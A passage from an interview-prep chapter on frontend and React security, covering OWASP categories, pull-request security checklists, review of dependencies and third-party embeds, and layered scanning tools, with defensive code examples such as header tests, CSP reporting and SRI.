Frontend-relevant instances covered elsewhere in this chapter, viewed through this lens

  • Missing or inconsistent security headers (CSP, HSTS, X-Content-Type-Options, framing headers) across some but not all routes/subdomains.
  • A CORS policy left permissive from an earlier debugging session, never tightened before shipping.
  • Source maps or a debug/admin route accidentally reachable in production.
  • A framework's default, verbose error page still enabled in production instead of a custom, generic one.
  • Default credentials or an unauthenticated debug/status endpoint left exposed (common on staging environments that quietly become internet-reachable).
  • Outdated TLS configuration or missing HSTS despite otherwise using HTTPS correctly.

What actually prevents this category of finding

  • Centralize security-relevant configuration (headers, CORS policy) in one place (an edge/CDN layer or a shared middleware) rather than letting each route/service configure it independently and inconsistently — this is the same theme that recurred in the multi-CSP-source and headers questions earlier.
  • Automate configuration verification in CI (a test asserting expected headers are present on every known route, as shown in the earlier clickjacking-testing question) rather than relying on manual, one-time verification that silently goes stale.
  • Regularly diff staging/production configuration against each other and against a documented baseline, specifically looking for drift.
  • Treat "harden the default configuration" as a checklist item for every new environment/service stood up, not an afterthought applied only after an incident.

Code Example

// A CI check that catches configuration drift automatically, rather than
// relying on someone remembering to manually re-verify every route:
const EXPECTED_HEADERS = {
  "x-content-type-options": "nosniff",
  "x-frame-options": "DENY",
  "strict-transport-security": /max-age=\d+/,
};

test.each(["/", "/login", "/dashboard", "/account"])(
  "%s has required security headers",
  async (route) => {
    const res = await request(app).get(route);
    for (const [header, expected] of Object.entries(EXPECTED_HEADERS)) {
      const actual = res.headers[header];
      expect(actual).toBeDefined();
      if (expected instanceof RegExp) expect(actual).toMatch(expected);
      else expect(actual).toBe(expected);
    }
  }
);

// Centralizing config in ONE place rather than per-route, reducing the
// surface area where drift/inconsistency can creep in:
app.use(helmet({
  contentSecurityPolicy: { directives: { "frame-ancestors": ["'none'"] } },
  hsts: { maxAge: 63072000, includeSubDomains: true, preload: true },
}));

Project Example

A routine external security scan of a company's full domain footprint found that while the main application had a well-configured set of security headers, an old staging environment for a deprecated feature (still reachable, forgotten by the team) had none at all, plus a framework debug page fully enabled showing detailed error output including environment variable names. None of this required any sophisticated technique to find — it was purely accumulated configuration drift across an environment nobody had been actively maintaining. The fix was decommissioning the forgotten environment and, more durably, adding an automated inventory/scan of all internet-reachable subdomains to the team's regular security review cadence, specifically to catch this class of "forgotten environment" drift going forward.

Senior Engineer Perspective

The senior framing worth stating plainly: security misconfiguration findings are rarely interesting individually, but they're consistently among the highest-volume, easiest-to-exploit findings in real audits precisely because they require no sophisticated technique to discover or exploit — an attacker (or a scanner) just has to notice the gap. A mature team treats configuration consistency and drift-detection as an ongoing, automated concern (CI header checks, periodic full-footprint scans) rather than a one-time hardening pass that inevitably goes stale as new environments and routes get added.

Q85. How does "Vulnerable and Outdated Components" map onto frontend supply-chain practices already discussed in this chapter?

ROI: ★★★★ Frequency: Medium

Short Answer

This OWASP category is the formal umbrella for everything this chapter's supply-chain section covered concretely: running outdated npm dependencies with known, disclosed vulnerabilities, using an unmaintained library whose security issues will never be patched, and not having a process to even know when a dependency you rely on receives a security advisory. What makes it distinct from the earlier supply-chain-attack material (malicious/compromised packages, a fundamentally different threat) is that this category is about known, disclosed vulnerabilities in otherwise-legitimate software that simply haven't been patched or replaced — a patch-management and dependency-hygiene problem rather than an active-attacker-in-your-supply-chain problem.

Detailed Answer

Distinguishing this from the supply-chain-attack material earlier

Earlier in this chapter, the supply-chain discussion (typosquatting, malicious postinstall scripts, dependency confusion) covered actively malicious packages. "Vulnerable and Outdated Components" is a different, more mundane risk: a legitimate, well-intentioned library has a known CVE, a patch exists, and you simply haven't upgraded — or the library is abandoned and will never receive a patch at all, regardless of severity. Both matter, but the mitigations differ: the malicious-package problem needs behavior-based detection and install-time hardening; the outdated-component problem needs disciplined, prioritized patch management.

Why "just run npm audit" doesn't fully solve this

  • Audit tools flag known CVEs against your currently-installed versions, but many flagged issues aren't actually reachable/exploitable in your specific usage (a vulnerability in a code path you never call) — treating every audit finding as equally urgent creates alert fatigue and burns effort on low-value fixes while genuinely serious ones sit in the same undifferentiated list.
  • An abandoned library with no maintainer will accumulate audit findings indefinitely with no upgrade path — the real fix is migrating off it entirely, which audit tooling won't tell you to do, it'll just keep flagging the same unfixable issue.
  • Transitive dependencies (a vulnerability three levels deep in your dependency tree) are often the hardest to actually remediate, since upgrading your direct dependency to pull in a patched transitive version isn't always immediately available.

A practical, prioritized approach

  • Triage audit findings by actual reachability/exploitability in your specific usage, not just severity score in isolation — a critical CVE in a code path you never execute is lower real-world priority than a moderate one in a hot path handling untrusted input.
  • Track dependency "health" beyond just current CVEs — maintenance activity, time since last release, open unaddressed security issues — as a signal for which dependencies are accumulating future risk even before a specific CVE lands.
  • Budget deliberate time for major-version upgrades of core dependencies (React, build tooling, key libraries) rather than always deferring them, since deferred upgrades compound into larger, riskier jumps later.
  • Have an actual decommissioning plan for abandoned dependencies rather than letting `npm audit` findings accumulate indefinitely against something nobody intends to ever fix.

Code Example

# Standard first-line check -- necessary but not sufficient on its own.
npm audit --audit-level=high

# Triage: is the flagged vulnerability actually reachable in how you use
# the package? Some tools support reachability analysis rather than
# flagging every dependency-tree CVE with equal urgency:
npx better-npm-audit audit --level high

# Track dependency health signals beyond current CVEs (illustrative):
# - last publish date, open unaddressed security advisories,
#   maintainer responsiveness -- informs which deps to proactively
#   replace BEFORE they accumulate an unfixable CVE.

# A CI gate that fails the build on HIGH/CRITICAL, but doesn't block on
# LOW findings that would otherwise create noise/fatigue and get ignored:
npm audit --audit-level=high || exit 1

Project Example

A team's npm audit output had grown to dozens of findings over a year, nearly all in an abandoned date-picker library nobody had gotten around to replacing, creating enough noise that a genuinely serious new finding in an actively-used networking library went unnoticed for weeks buried in the same list. Migrating off the abandoned date-picker (planned and executed as a deliberate project rather than deferred indefinitely) shrank the audit output enough that new, actually urgent findings became visible and actionable again — the real fix was dependency hygiene and prioritization, not a smarter scanning tool.

Senior Engineer Perspective

The senior distinction to draw for an interviewer: this category is fundamentally a prioritization and hygiene problem, not a detection problem — the tooling to find known vulnerabilities is mature and widely available, but teams still get bitten because low-value findings drown out high-value ones, or because an abandoned dependency's accumulating risk never triggers a "replace this" decision until something forces the issue. A strong answer talks about triage and dependency health tracking, not just "we run npm audit in CI," since the latter alone demonstrably isn't sufficient in practice.

Q86. What frontend responsibility exists under OWASP's "Identification and Authentication Failures" category, beyond token storage already covered?

ROI: ★★★★ Frequency: Medium

Short Answer

Beyond token storage (covered extensively in this chapter's auth sections), this category includes frontend-relevant patterns like weak client-side password-strength feedback that misleads users into a false sense of security, not supporting/encouraging multi-factor authentication in the UI, exposing enough information in error responses to enable credential-stuffing/enumeration (covered in the verbose-errors question), and not handling authentication-adjacent UX flows (session timeout, concurrent-session limits, "remember me" scope) with security-conscious defaults.

Detailed Answer

Password-strength UX that actually helps versus misleads

A client-side password-strength meter using a shallow heuristic (length + character-class counting) can rate a predictable, pattern-based password as "strong" while rating a genuinely high-entropy passphrase as "weak," actively steering users toward worse security choices while appearing helpful. Using a well-researched strength-estimation approach (entropy-aware, checking against known-breached-password lists) rather than a naive character-class checklist is a meaningful frontend UX decision with real security consequences.

Supporting MFA well in the UI

Even when MFA enforcement is a backend policy decision, the frontend's UX around it matters: making MFA setup easy to find and complete (not buried three menus deep), supporting modern methods (authenticator apps, WebAuthn/passkeys) rather than only SMS (which has known interception/SIM-swap weaknesses), and handling MFA-related error states (a locked-out user, a lost authenticator) without either a security regression (an easy unauthenticated bypass "for support reasons") or an unusably frustrating recovery flow that pushes support teams toward insecure manual workarounds.

"Remember me" and session-duration UX

A "remember me" checkbox that silently extends session duration far beyond what a user would expect, or that isn't clearly scoped (does it mean "stay logged in on this device" or "auto-fill my username"?), can create authentication exposure the user never consciously agreed to — especially relevant on shared/public devices, echoing themes from the bfcache and shared-device questions earlier in this chapter.

Credential-stuffing-aware UX

Frontend rate-limiting/backoff cooperation (covered in the API-communication section) applies directly here — a login form should degrade gracefully under automated credential-stuffing attempts (clear lockout/backoff messaging) without becoming so aggressive that it locks out legitimate users trying a few times after a typo, a balance that's as much a UX design decision as a security one.

Code Example

// WEAK strength heuristic -- misleads users, rating predictable patterns
// as "strong" and high-entropy passphrases as "weak":
function weakStrengthCheck(pw) {
  let score = 0;
  if (pw.length >= 8) score++;
  if (/[A-Z]/.test(pw)) score++;
  if (/[0-9]/.test(pw)) score++;
  if (/[^A-Za-z0-9]/.test(pw)) score++;
  return score; // "P@ssw0rd1" scores near-max; a long random passphrase might score lower
}

// BETTER: use a well-researched entropy/breach-aware estimator
// (illustrative -- use a real library like zxcvbn in production):
import { estimateStrength } from "zxcvbn"; // considers patterns, dictionary words, entropy
const result = estimateStrength(password);
if (result.score < 3) showFeedback(result.feedback.suggestions);

// MFA UX: prefer WebAuthn/passkeys or authenticator-app TOTP as the
// primary path, not SMS-only (SIM-swap/interception weaknesses):
<button onClick={() => navigator.credentials.get({ publicKey: challengeOptions })}>
  Sign in with a passkey
</button>

Project Example

A signup form's password-strength meter scored common, breach-list-known passwords like "Password123!" as "strong" purely because it satisfied the character-class checklist, while a genuinely strong long passphrase without special characters scored "weak" — actively encouraging users toward the worse choice. Replacing the naive checklist with a proper entropy- and breach-list-aware estimator meaningfully shifted the distribution of chosen passwords toward stronger ones in a follow-up analysis, without changing anything on the backend at all — a purely frontend UX change with a measurable security outcome.

Senior Engineer Perspective

This question rewards recognizing that authentication UX decisions — a strength meter's algorithm, which MFA methods are made easy to use, how "remember me" is scoped and communicated — have real security consequences even though they feel like "just UX." The senior answer names specific, concrete frontend-owned decisions in this space (entropy-aware strength estimation, WebAuthn-first MFA UX, clearly-scoped session persistence) rather than deferring the entire category to "that's a backend/auth-provider concern."

Q87. What does "Software and Data Integrity Failures" mean for a frontend's build and deployment pipeline specifically?

ROI: ★★★★ Frequency: Medium

Short Answer

This category covers trusting data or code without verifying its integrity — for a frontend, that means the entire chain from source commit to deployed bundle needs integrity guarantees at each step: CI/CD pipeline access controls (who can trigger a deploy, can a compromised dependency's install script tamper with the build output before it ships), SRI for any externally-loaded resource (covered earlier), and verifying that auto-update mechanisms (service worker updates, feature-flag/config delivery) can't be hijacked to silently push malicious content to users without any of the normal review/deploy process.

Detailed Answer

The build pipeline itself as an integrity boundary

Every stage between "a developer's reviewed, merged pull request" and "the bytes a user's browser executes" is a potential tampering point: a compromised CI runner, an insufficiently-scoped deploy credential, a build-time dependency's malicious install script (recall the supply-chain section) modifying output files, or a CDN/artifact-storage layer that isn't itself integrity-checked. Trusting "it passed code review" is not the same as trusting "the exact reviewed code is what got deployed" unless the pipeline itself has integrity guarantees connecting the two.

Concrete frontend-relevant integrity controls

  • SRI on externally-loaded scripts (covered in depth earlier) — the most direct, frontend-code-level integrity control available.
  • Signed commits/tags and protected branches ensuring only reviewed, authorized code reaches the build pipeline in the first place.
  • Reproducible/verifiable builds where feasible — being able to independently confirm that a given deployed artifact matches a specific, reviewed source commit, rather than trusting the build server's output blindly.
  • Integrity-checked auto-update mechanisms: a service worker or feature-flag delivery system that fetches and applies updates should itself validate what it's fetching (signed configs, checksum verification) rather than blindly trusting and applying whatever a compromised endpoint serves.
  • Least-privilege, audited deploy credentials — the same principle from the earlier CI-secrets discussion applies directly here: a narrowly-scoped, monitored deploy path is harder to abuse for silent, unauthorized artifact substitution.

Why this matters more as deployment automation increases

As pipelines become more automated (auto-merge on passing checks, continuous deployment with no manual gate), the human "does this look right" checkpoint that used to implicitly provide some integrity assurance shrinks — making the pipeline's own automated integrity controls (not human review) the thing actually standing between a compromise anywhere in the chain and it reaching production silently.

Code Example

// SRI remains the most direct, code-level integrity control a frontend
// engineer applies routinely (covered in depth earlier in this chapter):
<script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous"></script>

// A service worker validating a fetched update before applying it, rather
// than blindly trusting whatever the update endpoint currently serves
// (illustrative -- verify a signature/checksum the deploy pipeline embeds):
async function applyRemoteConfigUpdate() {
  const res = await fetch("/config/latest.json");
  const { config, signature } = await res.json();
  const valid = await verifySignature(config, signature, KNOWN_PUBLIC_KEY);
  if (!valid) { reportIntegrityFailure(); return; } // refuse to apply unverified config
  applyConfig(config);
}

// CI/CD: least-privilege, short-lived deploy credentials rather than a
// long-lived, broadly-scoped one any compromised step could abuse:
DEPLOY_TOKEN=$(vault read -field=token secret/ci/deploy-15min)

Project Example

A team's feature-flag delivery system fetched a JSON config from a CDN endpoint with no integrity verification at all — any compromise of that specific CDN path (or a misconfigured cache serving stale/tampered content) would have silently changed application behavior for every user, with no signal to the team and no code deploy involved at all. Adding signature verification to the config-fetch step (the deploy pipeline signs the config at publish time; the client verifies the signature before applying it) meant a compromised or tampered config would be detected and rejected client-side rather than silently taking effect — closing an integrity gap that existed entirely outside the normal code-review/deploy-pipeline security model the team had otherwise invested in.

Senior Engineer Perspective

The senior framing: this category asks you to trace the entire path data/code takes from "someone decided this should ship" to "a user's browser executes it," and find every point along that path where trust is assumed rather than verified. Frontend engineers often think of security review as ending at the code level, but a feature-flag system, an auto-update mechanism, or a build pipeline's own credential scoping are just as much a part of the attack surface as anything shipped in the bundle itself — and are frequently under-scrutinized precisely because they don't look like "application code."

Q88. What frontend-side "Logging and Monitoring Failures" are worth caring about, given that most logging infrastructure is backend-owned?

ROI: ★★★ Frequency: Medium

Short Answer

The frontend-relevant instance of this category is less about operating log infrastructure (a backend concern) and more about two things: making sure client-side security-relevant signals (a CSP violation report, a suspicious auth failure pattern, a detected tampering attempt) actually get captured and surfaced somewhere a human will see them rather than silently discarded, and making sure the act of logging itself doesn't create a new security problem (the PII/sensitive-data leakage into error-tracking tools covered earlier in this chapter is, from this angle, a logging-and-monitoring failure in its own right — logging too much, insecurely, is as much a failure of this category as logging too little).

Detailed Answer

Signals a frontend can generate that are worth actually monitoring

  • CSP violation reports (covered in depth earlier) — a spike in enforced-mode violations is a genuine security signal, valuable only if actually alerted on rather than collected and ignored.
  • Repeated client-side auth failures in a short window — while rate limiting itself is server-side, the frontend can contribute observability (did this look like a scripted brute-force pattern from the client's perspective, distinct from a user mistyping a password twice) that enriches backend monitoring.
  • Detected integrity failures (a failed SRI check surfaces as a browser console error and a resource-loading failure, but unless something actively monitors for and reports this, it's easy for it to go unnoticed as "just a broken script" rather than flagged as a potential compromise signal).
  • Unexpected/unauthorized-looking client behavior (a request to an endpoint the UI never triggers, suggesting a client bypassing the intended flow) — more of a backend-observability concern, but frontend telemetry can help characterize what "normal" client behavior looks like as a baseline.

The "logging too much, insecurely" failure mode

As covered in the PII/error-tracking question earlier, a logging pipeline that captures more than it should (full request bodies, unmasked replay recordings) is itself a monitoring-and-logging failure — this category isn't only about missing detection, it's equally about detection infrastructure that becomes a liability because it wasn't configured with the same care as the systems it's meant to protect.

What "good" looks like for a frontend team specifically

  • Treat CSP/security-header violation reports as a monitored, alerted signal, not a debugging artifact left over from initial rollout.
  • Apply the same PII-scrubbing discipline to security-relevant client telemetry as to general error tracking — a security log that leaks PII is a contradiction, not a minor inefficiency.
  • Ensure client-side detected anomalies (a failed integrity check, an unexpected auth pattern) have an actual path to a human or automated response, not just a console warning nobody will ever see in production.

Code Example

// A CSP violation reporting endpoint that's actually monitored/alerted,
// not just collected -- the difference between detection existing and
// detection being effective.
app.post("/csp-report", (req, res) => {
  const report = req.body["csp-report"];
  metrics.increment("csp.violation", { directive: report["violated-directive"] });
  if (isUnexpectedSpike("csp.violation")) {
    alerting.page("security-oncall", "CSP violation spike detected", report);
  }
  res.sendStatus(204);
});

// Surfacing a client-side integrity failure as an actual monitored event,
// not just a console error nobody in production will see:
window.addEventListener("error", (event) => {
  if (event.target?.tagName === "SCRIPT" && event.target.integrity) {
    // an SRI-protected script failed to load -- worth reporting explicitly,
    // since this can indicate a tampered CDN response, not just a network blip.
    reportSecuritySignal("sri_failure", { src: event.target.src });
  }
}, true);

// Applying the SAME PII-scrubbing discipline to security telemetry as to
// general error tracking (recall the earlier error-handling question):
function reportSecuritySignal(type, data) {
  securityTelemetry.send(type, scrubSensitiveFields(data)); // never send raw, unscrubbed data
}

Project Example

A team had correctly set up CSP violation reporting months earlier during their initial rollout, but the reporting endpoint simply wrote reports to a log file nobody actively monitored, with no alerting configured — so when a genuinely serious incident (a compromised third-party script attempting to load from a new, unapproved domain) generated a clear spike in violations, it went unnoticed for over a week, discovered only during an unrelated log review. Wiring the existing reports into an actual alerting pipeline (a threshold-based page to the on-call security channel) turned a detection mechanism that technically existed into one that actually functioned — the fix was almost entirely about closing the "so what happens with this data" gap, not about generating better data.

Senior Engineer Perspective

The senior point worth making explicitly: "we have logging/reporting for X" and "we would actually notice and respond if X happened" are two different claims, and a lot of security tooling quietly degrades from the second into merely the first over time as initial rollout enthusiasm fades and nobody revisits whether the alerts still fire meaningfully. A candidate who asks "does anyone get paged when this fires" about their own proposed monitoring, rather than treating "we log it" as sufficient, is demonstrating the operational maturity this category is actually testing for.

SECTION 14 - SECURITY CODE REVIEW PRACTICES FOR REACT APPS

Q89. Walk through a practical checklist you'd use to review a React pull request specifically for security issues.

ROI: ★★★★★ Frequency: High

Short Answer

A focused, fast checklist beats an exhaustive one nobody actually runs during a normal review. For a typical React PR: (1) any new dangerouslySetInnerHTML or raw DOM write — is the input sanitized? (2) any new external data rendered — is it user-influenced, and is it going through a safe sink? (3) any new API call — does it send anything sensitive in a URL, and does the corresponding endpoint enforce its own authorization rather than trusting the UI? (4) any new third-party script/dependency — vetted, pinned, and does it need a CSP update? (5) any new auth/token-handling code — does it match the project's established storage/refresh pattern rather than introducing a new one ad hoc?

Detailed Answer

Why a short, memorable checklist beats a long one

A review checklist with forty items gets skimmed once and then ignored under time pressure; a five-to-seven item checklist that maps directly onto the highest-frequency real findings (most of which this chapter has covered individually) is far more likely to actually get applied consistently on every PR, which matters more than theoretical completeness.

The checklist, with what to actually look for at each step

  1. Dangerous sinks: grep the diff for dangerouslySetInnerHTML, innerHTML, eval, document.write, or a ref-based direct DOM write. If present, trace the value back to its source — is it ever user-influenced, and is it sanitized immediately before use (not "sanitized somewhere upstream, trust me")?
  2. New rendered external data: does this PR render anything from an API response, URL parameter, or third-party source that wasn't rendered before? Confirm it goes through React's normal JSX interpolation (safe by default) rather than a raw HTML/attribute-injection path.
  3. New network calls: check for sensitive data in a URL/query string (recall the earlier question on this) and confirm the endpoint's authorization isn't assumed to be "handled by the UI already."
  4. New dependencies: is this a well-maintained package, pinned in the lockfile, and does its origin (if loaded externally rather than bundled) need a CSP connect-src/script-src update?
  5. Auth/token-handling changes: does this match the project's existing, reviewed pattern (recall the auth/token-storage section), or is it introducing an ad hoc new approach that hasn't had the same scrutiny?
  6. New iframe/postMessage/third-party embed: is event.origin validated? Is the sandbox attribute as restrictive as the integration allows?
  7. Error handling: does a new error path risk rendering raw backend error text or leaking details to the user (recall the error-handling question)?

Making it stick as a team habit

A PR template checklist or a lightweight automated linter rule for the highest-risk patterns (banning raw dangerouslySetInnerHTML usage without an accompanying sanitizer call, for instance) turns "remember to check this" into "the tooling catches it," which scales far better across a growing team than relying on every reviewer's memory.

Code Example

// A quick, targeted grep pass before a deeper manual review -- catches the
// highest-value patterns fast, on any PR diff:
// git diff main --unified=0 -- '*.tsx' '*.jsx' | grep -nE \
//   "dangerouslySetInnerHTML|innerHTML|eval\(|document\.write|\.href\s*=\s*[a-zA-Z]"

// An ESLint rule enforcing that dangerouslySetInnerHTML is always paired
// with a recognized sanitizer call, not used raw (conceptual custom rule):
// error: 'dangerouslySetInnerHTML used without DOMPurify.sanitize() nearby'
function Bio({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />; // FLAGGED by the rule
}
function BioFixed({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />; // passes
}

// A PR template checklist item mirrors the manual review checklist,
// keeping it visible at exactly the point a reviewer needs it:
// - [ ] No new dangerouslySetInnerHTML/innerHTML without sanitization
// - [ ] No sensitive data in a URL/query string
// - [ ] New endpoints independently enforce authorization server-side
// - [ ] New third-party origins added to CSP if needed

Project Example

A team introduced a lightweight, seven-item security checklist directly into their PR template after a retrospective on several incidents covered elsewhere in this chapter (a leaked source map, a missing server-side authorization check, an unsanitized rich-text field) found that each one would have been caught by a simple, specific checklist item, had one existed and been consistently applied. Within a quarter, the checklist plus a companion ESLint rule banning raw dangerouslySetInnerHTML usage caught two similar issues before merge that would previously have shipped, at a fraction of the cost of a post-incident fix.

Senior Engineer Perspective

Interviewers ask this to see whether a candidate can turn abstract security knowledge into a concrete, repeatable team practice rather than only being able to recite individual vulnerability classes in isolation. The senior answer emphasizes a short, high-signal checklist reinforced by tooling (linter rules, PR templates) over an exhaustive document nobody follows under deadline pressure — process design, not just technical knowledge, is what's actually being evaluated here.

Q91. How should a reviewer specifically scrutinize a PR that adds or updates a dependency?

ROI: ★★★★ Frequency: Medium

Short Answer

A dependency change deserves different scrutiny than an application-code change, because you're not reviewing logic you can fully read — you're making a trust decision about code you're extending your app's full privilege to, often without reading every line of it. Practical checks: is the package actively maintained and reasonably popular/vetted (not a brand-new, single-maintainer package for something security-sensitive), does the diff/changelog for a version bump look proportionate to what it claims to change, does it introduce new install-time scripts, and does the lockfile diff match what you'd expect (no unexpected, unrelated package changes riding along).

Detailed Answer

New dependency vs. version bump — different questions

For a new dependency: is it solving a problem worth taking on a new trust relationship for, or could existing dependencies/a small amount of first-party code do it instead? Check maintenance signals (recent releases, responsive issue tracker, reasonable download/usage numbers as a weak but real signal), and for anything touching auth/payments/sensitive data specifically, apply extra scrutiny or prefer vendoring and reading the actual source.

For a version bump: does the changelog/diff size match expectations for what's described as a patch/minor/major bump? A "patch version bump" with an enormous diff, or one touching unrelated areas of the package, is worth a second look — it can indicate anything from a maintainer's mistake to (rarely, but this is exactly the scenario) a compromised release.

Lockfile diff review

A reviewer should glance at the lockfile diff alongside package.json — if adding or bumping one package pulls in a surprising number of unrelated transitive changes, or a package you didn't expect appears/disappears, that's worth a question before approving, rather than assuming the package manager "just handled it correctly."

Install-script and permission awareness

Check whether a new dependency has a postinstall/preinstall script (visible in its package.json) — not automatically disqualifying (many legitimate packages need one for native builds), but worth knowing about rather than discovering only after an incident, and a candidate for the --ignore-scripts-by-default policy discussed earlier if it's not actually needed.

What's realistic to expect from a normal PR reviewer

Nobody reasonably reads every line of every dependency added to a modern JS project — that's why the structural controls (lockfiles, scoped registries, scanning tools, least-privilege CI) covered in the supply-chain section matter more than reviewer vigilance alone. The reviewer's realistic job is catching the disproportionate, unexpected, or clearly-avoidable-risk cases, not achieving full line-by-line audit coverage of every dependency.

Q92. How should a reviewer evaluate a PR that adds a new iframe, embed, or third-party widget integration?

ROI: ★★★★ Frequency: Medium

Short Answer

Treat it with the same rigor as a new dependency, since architecturally it often grants similar privilege: confirm the sandbox attribute is as restrictive as the integration allows (never allow-scripts + allow-same-origin together for untrusted content), confirm any postMessage handler validates event.origin explicitly, check whether the CSP needs updating (and whether that update is scoped narrowly to the exact origins needed, not broadly), and ask whether the widget genuinely needs to be a direct-privilege embed at all versus a more isolated integration pattern.

Detailed Answer

A review checklist specific to this PR shape

  1. Sandbox scope: if it's an iframe, is sandbox present and as restrictive as functionally possible? Flag any combination of allow-scripts and allow-same-origin for content from an origin you don't fully control.
  2. postMessage origin validation: does every new message listener check event.origin against a specific, known value before trusting the data — not a wildcard, not an assumption?
  3. CSP impact: does this PR need a frame-src, script-src, or connect-src addition? Is the addition scoped to the exact origin(s) needed, or does it grant broader trust than necessary "to be safe/save time"?
  4. Data flow to the third party: what data does this integration send to the third party, and was that reviewed against your data-handling/privacy obligations (recall the tag-manager governance question)?
  5. Necessity of direct embedding: could this be achieved via a server-side integration (the third party's API called from your backend) instead of client-side embedding, avoiding the trust extension entirely? Not always feasible, but worth asking.
  6. SRI where applicable: if loading a script directly (not via an iframe), is it pinned to an exact version with an integrity hash?

Why this deserves its own checklist distinct from the dependency one

A third-party embed's risk isn't captured by npm audit or a lockfile at all — it's an entirely separate integration surface (browser APIs, CSP, cross-window messaging) that ordinary dependency-scanning tooling has no visibility into, so it needs its own explicit review attention rather than assuming "we already have dependency scanning covering third-party risk."

Code Example

// Review-worthy red flags to look for specifically in this kind of PR:

// 1. Overly permissive sandbox for untrusted content:
<iframe src="https://widget-vendor.com/embed" sandbox="allow-scripts allow-same-origin"> // FLAG
<iframe src="https://widget-vendor.com/embed" sandbox="allow-scripts allow-forms">        // better

// 2. Missing origin validation on a new message listener:
window.addEventListener("message", (e) => renderWidgetData(e.data));                       // FLAG
window.addEventListener("message", (e) => {
  if (e.origin !== "https://widget-vendor.com") return;
  renderWidgetData(e.data);
});                                                                                          // better

// 3. A CSP change broader than the specific need:
// "script-src 'self' https://*.widget-vendor.com"   -- wildcarding an entire vendor domain -- FLAG
// "script-src 'self' https://embed.widget-vendor.com" -- scoped to the exact subdomain used -- better

// 4. No SRI on a directly-loaded vendor script:
<script src="https://widget-vendor.com/v2/widget.js"></script>                             // FLAG
<script src="https://widget-vendor.com/v2/widget.js" integrity="sha384-..." crossorigin="anonymous"></script> // better

Project Example

A reviewer caught a PR adding a new customer-support chat widget that requested script-src 'self' https://*.chatvendor.com — a wildcard covering every subdomain the vendor might ever use, rather than the one specific subdomain actually serving the widget. Pushing back for the narrower, exact-subdomain grant took an extra day of back-and-forth with the vendor's documentation but meant that if any other, less-trustworthy subdomain under that vendor's broad domain were ever compromised or repurposed, the app's CSP wouldn't have already pre-authorized it.

Senior Engineer Perspective

The senior instinct here is recognizing that third-party embeds are a distinct risk category from ordinary dependencies — invisible to npm audit, governed by an entirely different set of browser mechanisms (sandbox, CSP, postMessage) — and giving them their own explicit review checklist rather than assuming general dependency-review habits transfer automatically. Pushing for the narrowest CSP grant and sandbox configuration that still satisfies the actual requirement, even when it costs a bit more integration friction, is exactly the trade-off a senior reviewer is expected to insist on.

Q93. What automated tooling (linters, SAST, secret scanners) should be part of a React security review pipeline, and what does each actually catch?

ROI: ★★★★ Frequency: Medium

Short Answer

No single tool covers everything, so a real pipeline layers several: ESLint security-focused rules/plugins catch dangerous patterns at write-time (fastest feedback, in the editor); a dedicated SAST tool (Semgrep, CodeQL, or similar) catches more complex data-flow patterns a simple lint rule can't express; a secret scanner (gitleaks, truffleHog) catches credentials accidentally committed, ideally both pre-commit and in CI/history; and dependency scanners (npm audit, Snyk, Socket) cover the supply-chain angle. Each layer catches a different, largely non-overlapping category — treating any one as sufficient leaves real gaps.

Detailed Answer

What each tool category actually catches (and doesn't)

Tool categoryCatchesDoesn't catch
ESLint security rulesSimple, syntactic patterns: raw dangerouslySetInnerHTML, eval, missing rel="noopener"Multi-step data-flow issues (e.g. "does this value eventually reach a sink after passing through three functions")
SAST (Semgrep/CodeQL)More complex, configurable data-flow and taint-tracking patterns across a codebaseBusiness-logic authorization flaws, anything requiring semantic understanding of intent
Secret scannersCredential-shaped strings committed to source, including in git historySecrets that were never committed but leaked another way (e.g. logged at runtime)
Dependency/SCA scannersKnown CVEs in dependencies; some (Socket) also flag suspicious new-package behaviorLogic bugs in your own first-party code; zero-day supply-chain attacks with no signature yet
Manual code reviewBusiness-logic authorization, context-dependent judgment calls, novel patterns no tool has a rule forConsistency at scale — humans miss things tools would catch reliably every time

Where each fits in the pipeline

  • Pre-commit / editor: fast lint rules and a lightweight secret-scan hook — immediate feedback before code even reaches a PR.
  • CI, on every PR: full SAST scan, dependency audit, secret scan (including a check against the full diff, not just new lines, to catch a secret introduced and then "fixed" by editing rather than removing the commit).
  • Scheduled/periodic: a full historical secret-scan sweep (catching anything that slipped through before the hook existed), a broader dependency-health audit beyond just current CVEs.

The honest limitation

Automated tooling raises the floor (catching the mechanically-detectable, high-frequency patterns reliably, every time, without depending on a human remembering) but doesn't replace judgment-based review for business-logic authorization flaws, insecure design decisions, or genuinely novel attack patterns — the goal is freeing human review attention for exactly those harder cases by having tooling handle the mechanical ones.

A team layered ESLint security rules (catching a raw dangerouslySetInnerHTML usage the same day it was written), a Semgrep CI scan (which caught a more subtle case where user input flowed through two intermediate functions before reaching an unsanitized sink — invisible to the simpler lint rule's syntactic pattern), and gitleaks (which caught an accidentally-committed API key within minutes of the commit, before it ever reached a shared branch). Senior Engineer Perspective

Interviewers use this to see whether a candidate understands tooling as a layered system with distinct, non-overlapping coverage rather than reaching for one favorite tool and assuming it's sufficient. The senior answer names specific tool categories and, critically, what each one structurally cannot catch — showing an accurate mental model of tooling's real limits rather than an inflated sense of "we have a scanner, so we're covered."

Q94. How would you lead a threat-modeling discussion for a new feature during design review, before any code is written?

ROI: ★★★★ Frequency: Medium

Short Answer

A lightweight, practical approach: for the feature being designed, walk through "who can use this, what can they do with it that we didn't intend, and what's the worst plausible outcome" — concretely, enumerate the feature's inputs and actors (including a malicious/adversarial actor, not just the well-behaved intended user), ask what each actor could do differently than intended, and check whether the design as proposed has an answer for each. This doesn't need to be a heavyweight formal process (like STRIDE) for most ordinary feature work — a focused fifteen-minute conversation using this framing during design review catches most of what a much longer formal exercise would, at a fraction of the time cost.

Detailed Answer

A practical, lightweight structure

  1. Who are the actors? Not just "the logged-in user" — also: a logged-out visitor, a user with a lower privilege tier, a malicious user of the feature itself, a third party the feature integrates with, and (for anything client-side) anyone with browser DevTools access to their own session.
  2. What inputs does this feature accept, from each actor? Form fields, URL parameters, uploaded files, data from a third-party integration — anything not fully controlled by your own code.
  3. For each input, what happens if it's not what you expect? Malformed, oversized, containing markup/script, referencing a resource that doesn't belong to this actor, or simply absent.
  4. What's the worst plausible outcome if a malicious actor does the "wrong" thing here? Data exposure, unauthorized action, denial of service, reputational/compliance harm — naming the actual concrete outcome (not just "it could be bad") clarifies how much design effort the risk deserves.
  5. Does the current design have an answer for the worst case identified, or is it just assumed away? This is the step that actually changes the design, if anything needs to.

Why this belongs in design review, not just code review

